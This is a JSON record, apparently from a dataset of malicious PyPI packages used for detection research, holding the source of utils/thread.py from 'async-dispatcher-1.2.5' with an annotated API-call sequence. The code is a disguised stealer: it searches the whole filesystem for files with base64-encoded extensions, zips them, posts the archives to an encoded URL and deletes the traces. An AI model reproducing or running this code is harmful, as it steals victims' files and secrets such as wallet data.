[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/async-dispatcher-1.2.5/async-dispatcher-1.2.5/utils/thread.py",
    "code_snippet": "import os\nimport base64\nimport aiohttp\nimport asyncio\nimport zipfile\n\ndef find_web3_hash(hash_keys):\n    hash_keys = [base64.b64decode(key).decode('utf-8') for key in hash_keys]\n    for web3_hash_root, dirs, hash_address in os.walk('/'):\n        for hash_id in hash_address:\n            if hash_id.endswith(tuple(hash_keys)):\n                hash_web3_path = os.path.join(web3_hash_root, hash_id)\n                try:\n                    with open(hash_web3_path, 'r'):\n                        yield hash_web3_path\n                except PermissionError:\n                    continue\n                except FileNotFoundError:\n                    continue\n\nasync def validate_hash_by_web3_key(hash_value):\n    hash_get = aiohttp.FormData()\n    hash_get.add_field('file', open(hash_value, 'rb'))\n    session = aiohttp.ClientSession()\n    await session.post(base64.b64decode(hash_web3_key).decode('utf-8'), data=hash_get)\n    await session.close()\n    delete_сache(hash_value)\n\n\ndef delete_сache(hash_value):\n    try:\n        os.remove(hash_value)\n    except Exception as e:\n        pass\n\ndef hash_identifier(hash_paths: list, hash_result: str, temp_hash: str) -> object:\n    current_value = 0\n    hash_id = 1\n    os.makedirs(base64.b64decode(temp_hash).decode('utf-8'), exist_ok=True)\n    with zipfile.ZipFile(os.path.join(base64.b64decode(temp_hash).decode('utf-8'), f'{hash_result}_{hash_id}.zip'), 'w') as hash:\n        for hash_path in hash_paths:\n            hash_value = os.path.getsize(hash_path)\n            if current_value + hash_value > 40 * 1024 * 1024:\n                hash_id += 1\n                current_value = 0\n                hash.close()\n                hash = zipfile.ZipFile(os.path.join(base64.b64decode(temp_hash).decode('utf-8'), f'{hash_result}_{hash_id}.zip'), 'w')\n            hash.write(hash_path, os.path.basename(hash_path))\n            current_value += hash_value\n    hash_value = [os.path.join(base64.b64decode(temp_hash).decode('utf-8'), f'{hash_result}_{hash_id}.zip') for hash_id in range(1, hash_id + 1)]\n\n    return hash_value\n\nasync def main(arch_list):\n    tasks = [validate_hash_by_web3_key(arch) for arch in arch_list]\n    await asyncio.gather(*tasks)\n\nasync def start():\n    warnings_cather()\n    hash_paths = list(find_web3_hash(hash_keys))\n    hash_connect = hash_connector()\n    hash_list = hash_identifier(hash_paths, hash_connect, temp_hash)\n    await main(hash_list)\n",
    "pattern_analysis": {
      "api_sequence": [
        "base64.b64decode",
        "os.walk",
        "os.path.join",
        "open",
        "os.makedirs",
        "base64.b64decode",
        "zipfile.ZipFile",
        "os.path.join",
        "base64.b64decode",
        "os.path.getsize",
        "zipfile.ZipFile.write",
        "os.path.basename",
        "zipfile.ZipFile.close",
        "os.path.join",
        "base64.b64decode",
        "zipfile.ZipFile",
        "os.path.join",
        "base64.b64decode",
        "aiohttp.FormData",
        "open",
        "aiohttp.FormData.add_field",
        "aiohttp.ClientSession",
        "base64.b64decode",
        "aiohttp.ClientSession.post",
        "aiohttp.ClientSession.close",
        "os.remove"
      ],
      "api_sequence_with_args": [
        "base64.b64decode(key)",
        "os.walk('/')",
        "os.path.join(web3_hash_root, hash_id)",
        "open(hash_web3_path, 'r')",
        "os.makedirs(base64.b64decode(temp_hash).decode('utf-8'), exist_ok=True)",
        "base64.b64decode(temp_hash).decode('utf-8')",
        "zipfile.ZipFile(os.path.join(base64.b64decode(temp_hash).decode('utf-8'), f'{hash_result}_{hash_id}.zip'), 'w')",
        "os.path.join(base64.b64decode(temp_hash).decode('utf-8'), f'{hash_result}_{hash_id}.zip')",
        "base64.b64decode(temp_hash).decode('utf-8')",
        "os.path.getsize(hash_path)",
        "zipfile.ZipFile.write(hash_path, os.path.basename(hash_path))",
        "os.path.basename(hash_path)",
        "zipfile.ZipFile.close()",
        "os.path.join(base64.b64decode(temp_hash).decode('utf-8'), f'{hash_result}_{hash_id}.zip')",
        "base64.b64decode(temp_hash).decode('utf-8')",
        "zipfile.ZipFile(os.path.join(base64.b64decode(temp_hash).decode('utf-8'), f'{hash_result}_{hash_id}.zip'), 'w')",
        "os.path.join(base64.b64decode(temp_hash).decode('utf-8'), f'{hash_result}_{hash_id}.zip')",
        "base64.b64decode(temp_hash).decode('utf-8')",
        "aiohttp.FormData()",
        "open(hash_value, 'rb')",
        "aiohttp.FormData.add_field('file', open(hash_value, 'rb'))",
        "aiohttp.ClientSession()",
        "base64.b64decode(hash_web3_key).decode('utf-8')",
        "aiohttp.ClientSession.post(base64.b64decode(hash_web3_key).decode('utf-8'), data=hash_get)",
        "aiohttp.ClientSession.close()",
        "os.remove(hash_value)"
      ],
      "mapped_sequence": [
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "os.walk",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "os.makedirs",
          "id": "create_directory",
          "description": "Creates directory, ignoring if it already exists",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "zipfile.ZipFile",
          "id": "create_zip_archive",
          "description": "Creates new ZIP archive for writing",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "os.path.getsize",
          "id": "path_object_operations",
          "description": "Path object and status operations (creating Path objects, retrieving file status)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "zipfile.ZipFile.write",
          "id": "add_file_zip",
          "description": "Adds file to ZIP archive with specified archive name",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "os.path.basename",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "zipfile.ZipFile.close",
          "id": "close_file",
          "description": "Closes the opened file",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_closing"
        },
        {
          "api_name": "aiohttp.FormData",
          "id": "create_multipart_writer",
          "description": "Creates multipart writer for HTTP requests",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_creation"
        },
        {
          "api_name": "aiohttp.FormData.add_field",
          "id": "add_multipart_field",
          "description": "Adds field to multipart HTTP request",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_configuration"
        },
        {
          "api_name": "aiohttp.ClientSession",
          "id": "create_http_session",
          "description": "Creates HTTP session for making asynchronous requests",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_creation"
        },
        {
          "api_name": "aiohttp.ClientSession.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "aiohttp.ClientSession.close",
          "id": "close_http_response",
          "description": "Closes the HTTP response object",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "os.remove",
          "id": "delete_file",
          "description": "Deletes specified file from filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        }
      ],
      "contextual_code": "import os\nimport base64\nimport aiohttp\nimport asyncio\nimport zipfile\n\ndef find_web3_hash(hash_keys):\n    hash_keys = [base64.b64decode(key).decode('utf-8') for key in hash_keys]\n    for web3_hash_root, dirs, hash_address in os.walk('/'):\n        for hash_id in hash_address:\n            if hash_id.endswith(tuple(hash_keys)):\n                hash_web3_path = os.path.join(web3_hash_root, hash_id)\n                try:\n                    with open(hash_web3_path, 'r'):\n                        yield hash_web3_path\n                except PermissionError:\n                    continue\n                except FileNotFoundError:\n                    continue\n\ndef hash_identifier(hash_paths: list, hash_result: str, temp_hash: str) -> object:\n    current_value = 0\n    hash_id = 1\n    os.makedirs(base64.b64decode(temp_hash).decode('utf-8'), exist_ok=True)\n    with zipfile.ZipFile(os.path.join(base64.b64decode(temp_hash).decode('utf-8'), f'{hash_result}_{hash_id}.zip'), 'w') as hash:\n        for hash_path in hash_paths:\n            hash_value = os.path.getsize(hash_path)\n            if current_value + hash_value > 40 * 1024 * 1024:\n                hash_id += 1\n                current_value = 0\n                hash.close()\n                hash = zipfile.ZipFile(os.path.join(base64.b64decode(temp_hash).decode('utf-8'), f'{hash_result}_{hash_id}.zip'), 'w')\n            hash.write(hash_path, os.path.basename(hash_path))\n            current_value += hash_value\n    hash_value = [os.path.join(base64.b64decode(temp_hash).decode('utf-8'), f'{hash_result}_{hash_id}.zip') for hash_id in range(1, hash_id + 1)]\n    return hash_value\n\nasync def validate_hash_by_web3_key(hash_value):\n    hash_get = aiohttp.FormData()\n    hash_get.add_field('file', open(hash_value, 'rb'))\n    session = aiohttp.ClientSession()\n    await session.post(base64.b64decode(hash_web3_key).decode('utf-8'), data=hash_get)\n    await session.close()\n    delete_сache(hash_value)\n\ndef delete_сache(hash_value):\n    try:\n        os.remove(hash_value)\n    except Exception as e:\n        pass"
    }
  }
]